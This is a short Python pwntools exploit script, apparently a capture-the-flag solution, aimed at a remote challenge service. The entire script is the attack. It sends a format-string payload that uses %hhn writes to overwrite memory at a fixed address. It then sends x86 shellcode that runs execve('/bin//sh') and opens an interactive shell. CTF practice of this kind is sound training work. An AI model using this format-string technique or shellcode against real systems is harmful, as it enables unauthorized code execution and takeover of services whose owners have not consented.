from pwn import *

def write_mess(p, data):
    print p.recvuntil('choice:\n')
    p.sendline('2')
    print p.recv()
    p.sendline(data)

def exit(p):
    print p.recvuntil('choice:\n')
    p.sendline('4')

def read_mess(p):
    print p.recvuntil('choice:\n')
    p.sendline('3')
    print p.recv()

#p = process('./LICENSE')
p = remote('zsctf.zhakul.top', 30001)

payload = p32(0x08049120)+p32(0x08049120+1)+'%120x'+'%7$hhn'+'%17x'+'%8$hhn'

write_mess(p, payload)
read_mess(p)
payload = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
write_mess(p, payload)
exit(p)
p.interactive()
